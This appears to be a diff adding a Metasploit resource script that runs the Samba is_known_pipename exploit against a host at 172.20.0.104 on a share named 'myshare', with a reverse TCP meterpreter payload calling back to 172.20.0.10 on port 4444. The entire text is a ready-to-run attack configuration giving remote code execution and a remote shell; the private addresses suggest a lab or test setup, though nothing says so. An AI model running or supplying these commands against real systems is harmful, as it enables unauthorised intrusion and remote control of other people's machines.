@@ -1,0 +1,7 @@
+use exploit/linux/samba/is_known_pipename
+set RHOSTS 172.20.0.104
+set SMB_SHARE_NAME myshare
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 172.20.0.10
+set LPORT 4444
+exploit
